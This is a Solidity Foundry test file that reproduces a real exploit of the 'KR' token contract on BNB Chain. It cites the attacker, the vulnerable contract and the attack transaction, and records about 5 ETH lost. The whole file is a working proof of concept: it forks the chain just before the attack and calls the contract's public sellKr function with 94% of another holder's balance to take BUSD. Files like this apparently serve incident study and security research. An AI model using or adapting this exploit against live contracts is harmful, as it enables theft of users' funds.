// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~5 $ETH
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Vulnerable Contract : https://bscscan.com/address/0x15b1ed79ca9d7955af3e169d7b323c4f1eeb5d12
// Attack Tx : https://bscscan.com/tx/0x2abf871eb91d03bc8145bf2a415e79132a103ae9f2b5bbf18b8342ea9207ccd7

import "forge-std/Test.sol";
import "./../interface.sol";

interface IKR is IERC20 {
    function sellKr(uint256 tokenToSell) external;
}

contract ContractTest is Test {
    IERC20 BNBX = IERC20(0xF662457774bb0729028EA681BB2C001790999999);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IKR KR = IKR(0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12);
    uint256 tokenToSell;

    function setUp() public {
        vm.createSelectFork("bsc", 33_267_985 - 1);
        vm.label(address(KR), "KR");
        vm.label(address(BUSD), "BUSD");
    }

    function testExploit() public {
        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
        tokenToSell = KR.balanceOf(address(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656)) * 94 / 100;
        KR.sellKr(tokenToSell);
        emit log_named_decimal_uint("Attacker BUSD balance after attack", BUSD.balanceOf(address(this)), 18);
    }

    fallback() external payable {}
    receive() external payable {}
}
